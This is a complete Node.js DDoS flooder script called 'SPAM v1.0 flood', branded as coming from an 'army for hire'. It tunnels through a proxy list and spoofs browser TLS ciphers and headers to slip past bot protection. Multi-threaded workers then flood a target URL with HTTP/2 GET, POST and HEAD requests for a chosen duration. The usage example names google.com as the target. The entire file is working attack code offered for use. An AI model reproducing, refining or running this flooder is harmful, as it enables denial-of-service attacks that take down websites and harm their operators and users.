/*
    SPAM v1.0 flood

    Released by ATLAS API corporation (atlasapi.co)

    t.me/atlasapi for more scripts

    Made by Benshii Varga

    npm install colors header-generator
*/

process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const colors = require('colors');
const { HeaderGenerator } = require('header-generator');

let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "firefox", minVersion: 90, httpVersion: "2"},
        {name: "chrome", minVersion: 98, httpVersion: "2"}
    ],
    devices: [
        "desktop",
    ],
    operatingSystems: [
        "windows",
    ],
    locales: ["en-US", "en"]
});

const cplist = [
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
        "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
        "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
        "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
        "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];

const methods = [
    "GET",
    "POST",
    "HEAD",
]

if (process.argv.length < 8) {
	console.clear()
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/benshii"));
    console.log(`
    ${`${'SPAM v1.0 flood'.underline} | New header generator, optional debugging, 
    		      optimized requests and header order system.`.italic}

    ${'Usage:'.bold.underline}

        ${`node SPAM.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}debug${')'.red.bold}`.italic}
        ${'node SPAM.js https://google.com 300 5 90 proxy.txt true'.italic}\n`);
        process.exit(0)
};
    
const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';
const debug = process.argv[7] ? process.argv[7].toLowerCase() === "true" : false;


var parsed = url.parse(target);
const targetURL = new URL(target);

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

if (cluster.isMaster){
	console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/benshii"));
    console.log(`-`.red, 'Method:'.bold, '['.red, `SPAM`.underline, ']'.red);
	console.log(`-`.red, 'Target:'.bold, '['.red, `${target}`.underline, ']'.red);
	console.log("-".red, "Duration:".bold, "[".red, `${duration}`.underline, "]".red);
	console.log("-".red, "Threads:".bold, "[".red, `${threads}`.underline, "]".red);
	console.log("-".red, "Rate:".bold, "[".red, `${rate}`.underline, "]".red);
	console.log("-".red, "Proxy:".bold, "[".red, `${proxyfile}`.underline, "]".red);
	console.log("-".red, "Debug:".bold, "[".red, `${debug}`.underline, "]".red);
    for (let i = 0; i < threads; i++){
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(1);
    }, duration * 1000);
} else {
    attack();
}


function attack() {
    setInterval(async () => {
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 3500,
            maxSockets: 0,
        });

        await http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host,
        }).on("connect", async (res, socket) => {
            //socket.setSocketKeepAlive(true);
            if (res.statusCode === 200) {
                const client = http2.connect(parsed.href, {
                    protocol: "https:",
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush: false
                    },
                    createConnection: () => tls.connect({
                        host: parsed.host,
                        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
                        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                        servername: parsed.host,
                        rejectUnauthorized: false,
                        ALPNProtocols: ['h2', 'http/1.1'],
                        minVersion: 'TLSv1.2',
                        maxVersion: 'TLSv1.3',
                        socket: socket
                    }, async () => {
                        let rawHeaders = headerGenerator.getHeaders();
                        const order = [
                            "host",
                            "pragma",
                            "cache-control",
                            "sec-ch-ua",
                            "sec-ch-ua-mobile",
                            "sec-ch-ua-platform",
                            "upgrade-insecure-requests",
                            "user-agent",
                            "accept",
                            "sec-fetch-site",
                            "sec-fetch-mode",
                            "sec-fetch-user",
                            "sec-fetch-dest",
                            "referer",
                            "accept-encoding",
                            "accept-language",
                            "cookie",
                        ];
                        let randomHeaders = headerGenerator.orderHeaders(rawHeaders, order);
                        const headers = {
                            ":path": parsed.path,
                            ":method": methods[Math.floor(Math.random() * methods.length)],
                            ":authority": parsed.host,
                            ":scheme": targetURL.protocol.substring(0, targetURL.protocol.length - 1),
                            ...randomHeaders
                        }
                        for (let i = 0; i < rate; i++) {
                            const req = client.request(headers);
                            req.on("response", (data) => {
                                const status = data[':status'];
                                if (debug) {
                                    if (status < 500 && status >= 400 && status != 404) {
                                            console.log('[SPAM] |', colors.magenta(`${proxy[0]}:${proxy[1]}`.underline), "~", colors.red(`[${status}]`));
                                    } else if (status >= 500) {
                                            console.log('[SPAM] |', colors.magenta(`${proxy[0]}:${proxy[1]}`.underline), "~", colors.yellow(`[${status}]`));
                                    } else {
                                            console.log('[SPAM] |', colors.magenta(`${proxy[0]}:${proxy[1]}`.underline), "~", colors.green(`[${status}]`));
                                    }
                                }
                                //req.close();
                            }).end();
                        }
                    })
                });
            }
        }).on('error', () => {
            return
        }).end();
    })
}